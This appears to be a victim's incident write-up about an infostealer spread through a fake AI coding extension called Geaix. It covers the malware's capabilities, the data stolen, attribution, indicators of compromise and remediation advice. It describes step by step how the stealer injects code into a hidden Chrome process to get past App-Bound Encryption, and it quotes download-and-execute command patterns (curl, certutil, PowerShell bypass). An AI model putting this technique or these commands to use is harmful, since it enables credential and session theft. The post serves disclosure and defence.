| `0x180015a54..0x18001a0e6` | `0x4692` | **In-Memory Compression:** Calls `ntdll!RtlGetCompressionWorkSpaceSize` and `ntdll!RtlCompressBuffer` to pack the exfiltration archive. |
| `0x18003c0d4..0x18003e4a6` | `0x23d2` | **HTTPS Exfiltration Client:** Sends the compressed bundle via `WinHttpOpen` -> `WinHttpConnect` -> `WinHttpOpenRequest("POST", "/")` -> `WinHttpSendRequest` -> `WinHttpReceiveResponse` over port `443`. |
| `0x1800277a6..0x180029944` | `0x219e` | **Cryptocurrency Clipboard Clipper:** Keeps polling `GetClipboardSequenceNumber`. Matches clipboard strings against `bc1`, `ltc1`, `bitcoincash:`, `EQ`, `UQ`, and `addr1`, replacing matches via `OpenClipboard` -> `EmptyClipboard` -> `GlobalAlloc` -> `SetClipboardData`. |
| `0x1800662e1..0x18006827b` | `0x1f9a` | **Secondary Payload Runner:** Fetches follow-up tasks into `%TEMP%` using `curl.exe -fs -o` or `certutil.exe -urlcache -split` and executes `.exe` (`CreateProcessW`), `.msi` (`msiexec.exe /i /qn /norestart`), `.ps1` (`powershell.exe -ex bypass -File`), `.bat`/`.cmd` (`cmd.exe`), and also initializes COM (`CoCreateInstance`; the target CLSID wasn't recovered). |

#### 3. How `build.dll` Gets Around Chrome `v20` App-Bound Encryption
Since Chrome 127, cookies and passwords in `Login Data` and `Network\Cookies` are prefixed with `v20` and encrypted with a key stored in `Local State` under `os_crypt.app_bound_encrypted_key`. Unlike legacy `v10` keys (which any process running as the user can unwrap via `CryptUnprotectData`), `v20` keys are bound to Chrome's elevated `elevation_service.exe` COM service, which verifies that the calling process is a valid Chrome binary located in `Program Files`.

Here's how it gets around that, without even needing admin:
1. `Func 0x1800634a3` calls `CreateDesktopA` to create an off-screen virtual desktop so the user never sees a browser window pop up.
2. `Func 0x1800601c8` grabs the interactive shell's token (`GetShellWindow` -> `OpenProcessToken` -> `DuplicateTokenEx`) and launches/attaches to the browser on that hidden desktop.
3. `Func 0x18000b161` enumerates the browser's threads via `CreateToolhelp32Snapshot` (`Thread32First` / `Thread32Next`), opens a target thread (`OpenThread`), and suspends it (`SuspendThread`).
4. It allocates RWX/RX memory inside the legitimate browser process (`VirtualAllocEx`), writes its extraction stub (`WriteProcessMemory`), redirects the thread's instruction pointer `RIP` (`GetThreadContext` -> `SetThreadContext`), and resumes the thread (`ResumeThread`).
5. Because the injected code executes *inside* the signed `chrome.exe` image, Chrome's `elevation_service` / memory space unwraps the `app_bound_encrypted_key`. The stealer then scans and reads the decrypted 32-byte `master_encryption_key` out of the browser's memory (`VirtualQueryEx` + `ReadProcessMemory` + `CryptUnprotectMemory`), terminates the hidden browser instance (`TerminateProcess`), and closes the hidden desktop (`CloseDesktop`).
6. With the raw 32-byte `v20` AES-256-GCM key, `Func 0x180004082` decrypts every `v20` password in `Login Data` and every `v20` session cookie in `Network\Cookies` offline.

---

## What Was Stolen From My Machine

Knowing what the stealer *can* do is one thing, but I wanted to know what it actually got from *me*. Using the same Stage 3 binary and the offline disk, I wrote audit scripts (`dfir_dpapi.ps1`, `appb.ps1`, `cng.ps1`) that run the same decryption the malware runs, against my own browser profiles and app folders. Whatever those scripts could decrypt, the malware could too, and that gave me the list of things to change:

1. **Google Chrome (5 profiles):**
   - **564 saved passwords** decrypted via the `v20` App-Bound Encryption key (out of 699 total login rows).
   - **2,282 session cookies**, autofill records (`Web Data`), browsing history, and `Local Storage\leveldb`.
2. **Zen Browser (`%APPDATA%\zen\Profiles\*`):**
   - I had no Firefox Primary Password set, so `key4.db` was protected by an empty password (`""` with `global_salt`). NSS 3DES/AES-CBC decryption unlocked all **41 saved passwords** in `logins.json` and cookies for **585 domains** in `cookies.sqlite`. My active **Instagram** session cookie (`sessionid`) was in there, which is how they got into Instagram without my password.
3. **Vivaldi Browser (`%LOCALAPPDATA%\Vivaldi\User Data\Default`):**
   - Standard DPAPI `v10` logins and session cookies.
4. **Discord & Discord PTB (`%APPDATA%\discord` & `%APPDATA%\discordptb`):**
   - LevelDB `.ldb`/`.log` files contained `dQw4w9WgXcQ:` tokens protected with the DPAPI key in `Local State`. Decrypting them via `BCryptDecrypt` (`AES-256-GCM`) yielded live tokens for both my main account and my alt account. (The stealer's own strings only name `discord`, so I can't prove it also reads the PTB folder, but I treated both tokens as stolen.)
5. **Steam & Roblox:**
   - Steam `config\config.vdf`, `loginusers.vdf`, and `%LOCALAPPDATA%\Steam\local.vdf` (`ConnectCache` session tokens).
   - Roblox `%LOCALAPPDATA%\Roblox\LocalStorage\RobloxCookies.dat` (`.ROBLOSECURITY` cookie).
6. **Everything else typed into or saved in the browsers:**
   - **Autofill data:** names, addresses, phone numbers, and ID numbers I had typed into forms on government and school sites at some point.
   - **Saved card info:** Chrome only had the masked Google Pay entries (card type, last 4 digits, expiry, name on card). No full card numbers were saved there.
   - **Browsing history** from Chrome and Zen.
   - **Browser extension storage.** It takes the data of every installed extension, except a built-in skip list of 276 ad-blockers, antivirus add-ons and other common extensions. Crypto wallet extensions (MetaMask, Phantom and so on) and 2FA or password extensions aren't on that list, so they get taken.
7. **Information about the PC itself:** a full-resolution screenshot of my screen at that moment, the Windows username and PC name, hardware info, and the list of every program installed.
8. **From Stage 1, before the stealer even started:** for 15 minutes after each launch, the extension also sent `geaix.com` every running process (with command lines) and the names of new files in my `AppData`, `Temp` and `Public` folders.

**What about crypto wallets?** There are three ways this malware goes after crypto:
- **Wallet browser extensions:** it copies their stored data (the encrypted vault). With that file, an attacker can try to guess your wallet password offline, as many times as they like.
- **Exchange accounts:** saved passwords and login cookies for sites like Coinbase, Bitkub or Binance get stolen the same way as everything else.
- **The clipboard swapper:** while it's running, whenever you copy a Bitcoin, Litecoin, Bitcoin Cash, TON or Cardano address, it quietly replaces it with the attacker's address. If you paste that into a send screen without checking, your money goes to them.

It does **not** target desktop wallet apps. Exodus, Electrum, Atomic, Ledger Live and the rest don't appear anywhere in its 512 decoded strings.

Saved passwords and cookies also mean the accounts behind them were exposed, not just Discord and Instagram. In my case that was several Google and Microsoft accounts, ProtonMail, Facebook, GitHub, my cloud and domain providers (plus their API keys), PayPal and a couple of crypto exchanges, Steam, Roblox, Twitter, Twitch, and AI tools. All of them had their passwords changed and their sessions logged out.

One more thing: the stealer can also download and run anything else its server sends. I didn't find a second payload on disk, but I can't prove nothing else ran in memory, which is why I wiped the Windows install instead of just deleting the files.

---

## Who's Behind This?

I can't name anyone, and nothing here proves who they are. But I'm pretty suspicious this is a **team**, not one person, and that they're **Russian-speaking, likely based in Russia or a nearby country**.

**Why I think it's a team:**
- **The front is a whole fake product.** There's the `geaix.com` website with a dashboard and logins, plus an AI extension forked from Kilo Code. Its changelog has 9 believable release notes leading up to version `1.0.24`. That's a lot of work just for bait.
- **The backend is split up.** The dropper talks to `geaix.com`, but the stealer reports to three different domains (`dtapi.cc`, `x1zsp.cc`, `cfmlapi.cc`). It also carries a campaign ID, so whoever runs it can tell which campaign each victim came from.
- **It comes out of a build system.** The loader and the stealer were compiled 14 seconds apart, so this isn't a one-off hand-made sample.
- **Using the stolen sessions is another job.** Bots logged in from Los Angeles and Cologne 8 days later and ran an automated spam script.

That split is how stealer groups usually work: someone builds the stealer, someone spreads it, and someone buys or uses the stolen logs. It's also possible the Geaix people just rented the stealer from someone else.

**It's not just Geaix.** After writing the first version of this post I dug a bit more. Looking up `geaix.com`'s server, `64.204.180.86` (hosted in Frankfurt, Germany), on Censys showed eight more domains pointing at the same machine: `ahiak.com`, `aiqana.com`, `axqua.com`, `excelnt.ai`, `lebang.si`, `plikai.com`, `vunex.dev` and `opnzy.com`. I checked them myself on October 22:

- All of them still point to `64.204.180.86`.
- Seven of them show the **exact same website**, just renamed ("Create your account · Ahiak", "· Aiqana", "· Vunex" and so on). It's the same build, down to identical stylesheet files.
- Those seven also have the same `/dashboard/editor` page and the same `/api/vscode/software/pick` endpoint the Geaix extension uses to fetch the stealer. It answers `403` (it wants a logged-in token), not `404`, so the route is really there.
- `opnzy.com` points to the same server but only says "Not found" right now.

![Censys result for 64.204.180.86 listing geaix.com and the other AI-tool domains on the same server](/mrbeast/censys-shared-host.avif)
> One server in Frankfurt, nine "different" AI tools.

I didn't sign up or download extensions from them, so I can't prove every one of them pushes the same stealer. But same server, same site and same malware API with only the name swapped is very hard to explain as a coincidence. It looks like one operation making "new AI tools" in bulk, so when one name gets reported, the next one is already waiting. That's one more reason I think it's a team.

**Update (October 24, 2026): they moved, and now I can prove it.** After I reported `geaix.com` to the registrar, the hosting provider and abuse.ch on October 23, the old server went offline and `geaix.com` disappeared from DNS. The other eight domains didn't die, though. They hopped to `207.180.58.108` for a few hours, then landed on a new server, `179.61.227.71` (a different network, AS399486, registered to a Canadian company, with Censys placing the server in Paris; the IP block is again leased through IPXO).

![Censys host view for 179.61.227.71, with axqua.com, opnzy.com, plikai.com, vunex.dev and their www. names pointing at it](/mrbeast/censys-new-host.avif)
> New server, same domains.

So I made a throwaway account on one of them and checked. Seven of the sites now hand out their own copy of the extension at `/vsix/<brand>-1.0.25.vsix` (`vunex-1.0.25.vsix`, `axqua-1.0.25.vsix` and so on). I downloaded all seven and opened them up without running anything: every file has a different hash, but inside it's the Geaix extension with the **same dropper and the same payload endpoints**, with only the name and publisher swapped. `opnzy.com` is still the spare one with nothing on it.

That's exactly the "next name is already waiting" setup from above, now confirmed. The hashes are in the IOC list below, and all the samples are on [MalwareBazaar](https://bazaar.abuse.ch/browse/tag/Geaix/) under the `Geaix` tag.

**Why Russia:**
- The stealer **exits right away if the PC's language or keyboard is Russian** or from another CIS country (`ru`, `uk`, `be`, `kk`, `uz`, `az`, `hy`, `tg`, `tk`, `ky`, `ro-md`). Russian-speaking malware groups commonly do this so they don't get in trouble at home.
- There's a **Russian insult** hidden in the stealer's main routine.

These are strong hints, not proof. Strings and language checks can be planted to blame someone else.

---

## Indicators of Compromise (IOCs) & Hunting Rules

If you installed `geaix`, or any `.vsix` you downloaded by hand, check these right now.

### Host Paths
- `%USERPROFILE%\.vscode\extensions\geaix.geaix-1.0.24`
- `%USERPROFILE%\.antigravity\extensions\geaix.geaix-1.0.24`
- `%TEMP%\<prefix><sep><4-7 hex bytes>\` containing `javaw.exe`, `jli.dll`, and `vcruntime140.dll`, where `<prefix>` is one of:
  `setup`, `update`, `installer`, `svchost`, `wuauclt`, `msupdate`, `sysprep`, `runtime`, `winhlp`, `tmp`, `pkg`, `wsc`

### Behavioral & YARA / Hunt Queries
- Any `javaw.exe` executing from `%TEMP%` whose parent is `cmd.exe` spawned with `/c start "" /B` by a VS Code (`Code.exe`) or Antigravity extension-host process.
- Any `jli.dll` on disk whose PE Export Directory internal `Name` is `loader.dll` instead of `jli.dll`, or whose `TimeDateStamp` is `0x6acb8e1f` (`2026-10-11 13:24:47 UTC`) with no Rich header.
- PowerShell child processes spawned every 3 seconds executing:
  `powershell.exe -NoProfile -Command "Get-CimInstance Win32_Process | Select-Object ProcessId,ParentProcessId,Name,CommandLine | ConvertTo-Json -Compress"`

### Network IOCs
| Indicator | Type | Context |
|---|---|---|
| `https://geaix.com/vsix/geaix-1.0.24.vsix` | URL | Stage 1 VSIX delivery URL |
| `https://geaix.com/dashboard/editor` | URL | Stage 1 download referrer |
| `https://geaix.com/api/vscode/software/pick?platform=win` | URL | Stage 1 metadata endpoint (`x-geaix-feat: zip`) |
| `https://geaix.com/api/vscode/software/download/<id>` | URL | Stage 2 ZIP download endpoint |
| `https://geaix.com/api/vscode/software/started` | URL | Stage 2 execution callback |
| `wss://geaix.com/api/ws?client=vscode&token=<...>` | WebSocket | 15-minute live process & filesystem telemetry |
| `64.204.180.86` | IP | Original server behind `geaix.com` and the sibling sites (AS213250, Frankfurt, DE), offline since Oct 23, 2026 |
| `207.180.58.108` | IP | Interim server for the sibling sites on Oct 23, 2026 (AS213250) |
| `179.61.227.71` | IP | Current server for the sibling sites (AS399486), as of Oct 24, 2026 |
| `https://geaix.com/vsix/geaix-1.0.25.vsix` | URL | Replaced 1.0.24 on the same path (Oct 23, 2026) |
| `ahiak.com`, `aiqana.com`, `axqua.com`, `excelnt.ai`, `lebang.si`, `plikai.com`, `vunex.dev` (+ `www.`) | Domain | Same Geaix site under other names; each serves `/vsix/<brand>-1.0.25.vsix` with the same dropper (confirmed Oct 24, 2026) |
| `opnzy.com` (+ `www.`) | Domain | Points to the same IP, still no payload ("Not found") as of Oct 24, 2026 |
| `dtapi.cc:443` | C2 Domain | Primary Stage 3 HTTPS C2 (`0x18007e4ed`, XOR key `0x8d`) |
| `x1zsp.cc:443` | C2 Domain | Secondary Stage 3 HTTPS C2 (`0x18007d214`, XOR key `0xe5`) |
| `cfmlapi.cc:443` | C2 Domain | Tertiary Stage 3 HTTPS C2 (`0x180079451`, XOR key `0xd9`) |
| `01a12b22-5ca2-7f90-849a-8304fc081a08` | UUID | Campaign / Botnet UUID (`0x18007c6ff`, XOR key `0x43`) |

### File Hashes (SHA-256)
| File | Size (Bytes) | SHA-256 |
|---|---|---|
| `geaix-1.0.24.vsix` | `27,124,774` | `02cd28dc0a9c1ee109462aa6942dfbc3bdb1af9210315eaa326e73e49d01ac0d` |
| `geaix-1.0.25.vsix` | `28,531,046` | `b6ac717195b74240e6c1bddf202be6bb3e11e4dd5cd4767072b6a8fdd3567a8b` |
| `vunex-1.0.25.vsix` | `28,528,022` | `4e95d59ceff134e041a08ff8f78d3b52a12b1724768d2103c386215d7d164989` |
| `axqua-1.0.25.vsix` | `28,530,208` | `66d1899ba385c4b1dcea534aea16d00223233acacdcae0f9611ff97acb00ecc2` |
| `plikai-1.0.25.vsix` | `28,529,729` | `285ecbdb10b2ae2c71f82dbbd99aa73afcbb33333208929b8b751e95a480b62a` |
| `lebang-1.0.25.vsix` | `28,528,834` | `f101b41b19a38b7c42f7fff93f59f4a7e8dfbeff5ac2f3a3605523d5b8579c2c` |
| `ahiak-1.0.25.vsix` | `28,530,548` | `eb53d22a1d8a376960d2985c9c69826d52eaf535071e939296aa7102b3c43637` |
| `aiqana-1.0.25.vsix` | `28,530,663` | `f78c077fdce8231c654834294c686d6fe202665a5d4aca4041f8bc1b29bb96c2` |
| `excelnt-1.0.25.vsix` | `28,532,508` | `2d7c665f5282a6210b33e7f4cccc453b736ceba88ba9d27b868c0c5e0c046f08` |
| `extension/dist/extension.js` (inside VSIX) | `36,654,196` | `c9189e2c1ff2d216618059513735b034598cbb728d5cc6542f3f1ef79d3c7975` |
| `javaw.exe` (signed Adoptium Temurin) | `50,344` | `ca798475399c19c13be92b91f262003e82befe5ecc35a0e25e72522868466357` |
| `jli.dll` (malicious Stage 2 `loader.dll`) | `736,256` | `d76e906a18c04826996d1f30de248e7a0e50c48814c82e9583b36c91fdf66f00` |
| `vcruntime140.dll` (signed MS CRT) | `123,472` | `184146852727a9db4eea06178716bec3cdbb1015c911f6b0f915b184ad7775b2` |
| `unpacked_build_full.dll` (`build.dll`, rebuilt PE) | `607,744` | `dd81a7c12465d70e85e59ee49c1ed9fe4c9b4d2d65ea4b7e1857b84985444653` |

---

## What You Should Do

**If your account just sent out a scam like this:**
1. **Clean or reinstall the computer first.** If you change passwords while the stealer is still on the PC, it can steal the new ones as well. Do the password changes from your phone or another device you trust.
2. **Log out of every session, not just the password.** A stolen cookie keeps working until the site logs it out. On Discord, changing your password resets your token and logs out other devices. Also check **Settings -> Devices** and remove anything you don't recognize. On Instagram, Google, GitHub, Steam and the rest, use "log out of all devices" or the equivalent, then change the password.
3. **Discord: check your Ignored list.** Go to **Settings -> Content & Social -> Ignored accounts** and unignore the friends the bot muted, so you see the people who messaged you asking if you got hacked.
4. **If you have crypto:** check your exchanges' login history, withdrawals, withdrawal-address whitelists and API keys. If you had a wallet browser extension on that PC, move the funds to a new wallet with a new seed phrase, made on a clean device. Changing the extension password is not enough, because the attacker already has a copy of the vault.
5. **Tell your friends** it was a scam and that they shouldn't open the site or use the promo code.

**To avoid getting hit in the first place:**
1. **Treat extensions, plugins and mods like programs.** A VS Code extension can do anything you can do on your PC, with no sandbox. If a website asks you to download a `.vsix` and install it by hand instead of from the official Marketplace, that's a big red flag.
2. **Don't rely on the browser's built-in password saving.** Chrome's newer `v20` encryption makes stealing harder, but this stealer still got around it. A separate password manager that locks itself (Bitwarden, KeePassXC) is safer. If you use Firefox or Zen, at least set a Primary Password.
3. **2FA doesn't protect a stolen session.** 2FA protects the login step. A stolen cookie skips that step completely, so logging out sessions matters as much as the password.

Sorry again to everyone who got the scam from my Discord or Instagram on October 19 :( Everything's been changed and logged out, and that Windows install is gone. Go check your extensions, and see you in the next post! <3
